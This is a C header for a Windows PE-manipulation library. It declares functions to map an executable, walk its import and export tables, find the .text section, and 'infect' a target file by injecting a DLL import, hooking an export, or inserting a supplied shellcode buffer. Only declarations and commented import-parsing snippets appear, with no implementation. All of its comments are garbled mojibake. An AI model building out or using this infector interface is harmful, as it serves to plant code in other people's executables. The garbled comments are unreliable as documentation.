#ifndef _PE_
#define _PE_
#include "..\common\common.h"

//IMAGE_THUNK_DATA ����һ��DWORD���͵ļ��ϡ�ͨ�����ǽ������Ϊָ��һ�� IMAGE_IMPORT_BY_NAME �ṹ��ָ��,�䶨�����£�
//	IMAGE_THUNK_DATA{
//		union {
//			PBYTE ForwarderString;
//			PDWORD Function;
//			DWORD Ordinal;//�ж���ǰ�ṹ�����ǲ��������Ϊ����ģ�����ǵĻ���ֵΪ0x800000000,��ʱPIMAGE_IMPORT_BY_NAME������Ϊ����ʹ��
//			PIMAGE_IMPORT_BY_NAME AddressOfData;
//		}u1;
//} IMAGE_THUNK_DATA,*PIMAGE_THUNK_DATA;
//
//
//typedef struct _IMAGE_IMPORT_BY_NAME{
//	WORD Hint;// ����������
//	BYTE Name1[1];//�����������
//} IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME

////����ͨ��RVA�����λ�жϺ����ĵ��뷽ʽ��
////������λΪ1������ŵ��룬�������Ƶ���
//if(pThunk[j].u1.AddressOfData & IMAGE_ORDINAL_FLAG32)
//{
// printf("\t [%d] \t %ld \t ����ŵ���\n", j, pThunk[j].u1.AddressOfData & 0xffff);
//}
//else
//{
// //�����Ƶ��룬�����ٴζ��򵽺�����ź�����
// //ע�����ַ����ֱ���ã���Ϊ��Ȼ��RVA��
// PIMAGE_IMPORT_BY_NAME pFuncName = (PIMAGE_IMPORT_BY_NAME)ImageRvaToVa(
//	 pNtHeaders,    lpBaseAddress,
//	 pThunk[j].u1.AddressOfData,
//	 NULL);

// printf("\t [%d] \t %ld \t %s\n", j, pFuncName->Hint, pFuncName->Name);
//}

PVOID
	ImageVaToRva(
	__in PIMAGE_NT_HEADERS NtHeaders,
	__in PVOID Base,
	__in ULONG Rva
	);

//���ص���Ϣ
typedef struct pe_retn_msg{
	//��־�Ƿ�ִ�гɹ�
	bool isSuccessed;
	//���صĴ�����Ϣ
	TCHAR tsMsg[50];
}pe_retn_msg,*ppe_retn_msg;

//
PVOID pe_getMapViewOfFile(LPTSTR lpFilePath);

//����Ŀ���������Ŀ��ģ��
void pe_findDllModule(LPTSTR lpFilePath,LPSTR lpDllName,ppe_retn_msg p_msg);

//���ҵ�����Ŀ¼
bool pe_findExportDir(LPTSTR lpFilePath);

//���text�ε�ƫ��
DWORD pe_getTextSecOffset(PIMAGE_SECTION_HEADER pImage_section_header , int NumberOfSections);

//��Ⱦ 
void pe_infect(LPTSTR lpFilePath,LPTSTR lpDllName,LPSTR lpFuncName,ppe_retn_msg p_msg);

//��Ⱦ2
void pe_infect(LPTSTR lpFilePath,PBYTE lpShellCode,ppe_retn_msg p_msg,int size);

//������Ⱦ
void pe_infect_eat(LPTSTR lpFilePath,LPSTR lpDllName,LPSTR lpFuncName,ppe_retn_msg p_msg);

//
DWORD pe_getImportOriFuncAddressByOrdinal(PVOID lpBase,LPSTR lpDllName,DWORD dwOrdinal);

//
DWORD pe_getExportOriFuncAddressByOrdinal(PVOID lpBase,DWORD dwOrdinal);

#endif //_PE_